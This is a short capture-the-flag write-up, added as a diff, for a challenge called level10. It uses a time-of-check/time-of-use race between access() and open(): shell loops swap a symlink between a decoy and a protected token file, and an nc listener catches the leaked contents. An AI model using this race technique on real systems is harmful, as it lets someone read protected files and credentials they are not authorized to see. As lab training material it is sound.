@@ -1,0 +1,4 @@
+1.	strings ./level10	we can see that the program send the content of a file to an host via port 6969
+2.	we can see that there is a access() function that verify if we have the permission to open and read a file. so we create a decoy and slink it to a file then slink the real token with that file (we exploit the time between access() and open()): on one tab:	while true; do ln -fs /tmp/<decoyFile> /tmp/<symbolicLinkName>; ln -fs ~/token /tmp/<symbolicLinkName>; done
+3.	on another tab we exec rapidly the binary:	while true; do ./level10 /tmp/exploit <localhost>; done
+4.	on our localhost: nc -lk <port 6969>
